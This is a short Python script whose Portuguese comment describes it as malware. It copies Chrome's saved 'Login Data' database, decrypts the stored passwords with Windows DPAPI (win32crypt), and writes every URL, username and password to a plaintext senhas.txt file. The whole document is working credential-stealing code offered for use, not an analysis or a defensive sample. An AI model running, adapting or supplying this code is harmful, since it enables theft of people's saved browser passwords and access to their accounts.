import os
import sqlite3
import win32crypt



# Esse malware vai capturar todas as senhas do chrome que est√£o salvas em seu pc e retornara um arquivo senhas.txt
def GetPasswords():
		os.system('copy "C:\\Users\\'+os.getenv('username')+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" .')

		conChrome = sqlite3.connect('Login Data')

		db = conChrome.cursor()

		db.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')

		senhas = open('senhas.txt', 'w')
		for query in db.fetchall():
			try:
				passwd = win32crypt.CryptUnprotectData(query[3])[1]
				passwd = win32crypt.CryptUnprotectData(query[3])[1]
			except:
				print(f"Error em descriptografar: {query[3]}")
			try:
				senhas.writelines('\nURL1: ' + query[0]+'\nURL2: ' + query[1]+'\nUsername: ' + query[2])
			except:
				print(f"Error: {query[0]} ou {query[1]}")
			passw = str(passwd)
			senhas.writelines('\nPassword: '+passw+'\n')
		senhas.close()

GetPasswords()